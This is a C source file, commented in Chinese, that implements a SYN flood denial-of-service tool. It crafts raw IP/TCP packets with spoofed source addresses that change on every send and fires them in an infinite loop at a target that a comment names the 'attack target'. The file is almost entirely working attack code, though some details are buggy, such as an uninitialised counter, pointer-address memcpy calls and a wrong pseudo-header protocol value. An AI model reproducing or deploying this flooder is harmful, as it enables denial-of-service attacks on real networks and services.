#include"synconn.h"
static inline long myrandom(int begin,int end)
{
   // int gap = end - begin + 1;
    int ret = 0;
    srand((unsigned)time(NULL));
    ret = rand() % end + begin;
    return ret;
}

static ushort chksum(ushort *data,ushort length)
{
    int nleft = length;
    int sum = 0;
    ushort *word = data;
    ushort ret = 0;
    while(nleft > 1)
    {
        sum += *word++;
        nleft -= 2;
    }
    if(nleft == 1)
    {
        *(uchar *)(&ret) = *(uchar *)word;
        sum += ret;
    }
    sum = (sum >> 16)+(sum & 0xffff);
    sum += (sum >> 16);
    ret = ~sum;
    return (ret);
}
void sendsynfunc(int FakeIpHost,int sockfd,struct sockaddr_in *addr)
{
    int SendSEQ;
    int count;//统计发送循环次数
    char buf[40];//校验和计算
    char sendBuf[100];
    struct ip *ip;
    struct tcphdr *tcp;
    struct prehdr//tcp伪首部
    {
        struct sockaddr_in sourceaddr;//source address
        struct sockaddr_in destaddr;//dst daaress
        uchar zero;
        uchar protocol;
        ushort length;
    }prehdr;
   int len = sizeof(struct ip)+sizeof(struct tcphdr);
    //开始填充ip与tcp首部
   bzero(buf,sizeof(buf));
   bzero(sendBuf,sizeof(sendBuf));
   ip = (struct ip *)sendBuf;//指向发送缓冲区的头部
   ip->ip_v = 4;
   ip->ip_hl = 5;
   ip->ip_tos = 0;
   ip->ip_len = htons(len);
   ip->ip_id = 0;
   ip->ip_off = 0;//由内核填写
   ip->ip_ttl = myrandom(128,255);
   ip->ip_p = IPPROTO_TCP;
   ip->ip_sum = 0;
   ip->ip_dst = addr->sin_addr;//目的地址，即攻击目标
   printf("ipheader fill finished\n");
   tcp=(struct tcphdr*)(sendBuf+sizeof(struct ip));//获取指向TCP头部的指针
   tcp->seq = htonl((ulong)myrandom(0,65535));
   tcp->dest = addr->sin_port;//目的端口
   tcp->ack_seq = htons(myrandom(0,65535));
   tcp->syn = 1;
   tcp->urg = 1;
   tcp->window = htons(myrandom(0,65535));
   tcp->check = 0;//校验和
   tcp->urg_ptr = htons(myrandom(0,65535));
   //循环发送
   while(1)
   {
       if(SendSEQ++ == 65535){
            SendSEQ = 1;
       }
       //更新ip首部
       ip->ip_src.s_addr = htonl(FakeIpHost+SendSEQ);//每次随机产生源ip地址
       ip->ip_sum = 0;
       //更新tcp首部
       tcp->seq = htonl(0x12345678+SendSEQ);
       tcp->check = 0;
       // ip->ip_src.s_addr = myrandom(0,65535);
       printf("source addr is :%s\n",inet_ntoa(ip->ip_src));
       printf("dest addr is :%s\n",inet_ntoa(addr->sin_addr));
       printf("\n============================\n");
       //tcp伪首部数据填充
       prehdr.sourceaddr.sin_addr = ip->ip_src;
       prehdr.destaddr.sin_addr = addr->sin_addr;
       prehdr.zero = 0;
       prehdr.protocol = 4;
       prehdr.length = sizeof(struct tcphdr);
       //封装tcp首部与伪首部至buf;
       memcpy(buf,&prehdr,sizeof( prehdr));
       memcpy(buf+sizeof( prehdr),&tcp,sizeof(struct tcphdr));
       tcp->check = chksum((u_short *)&buf,12+sizeof(struct tcphdr));//校验和计算
       //封装ip和tcp首部数据包至sendBuf
       memcpy(sendBuf,&ip,sizeof(ip));
       memcpy(sendBuf+sizeof(ip),&tcp,sizeof(tcp));
       sendto(sockfd,sendBuf,len,0,(struct sockaddr *)&addr,sizeof(struct sockaddr));
   }
}
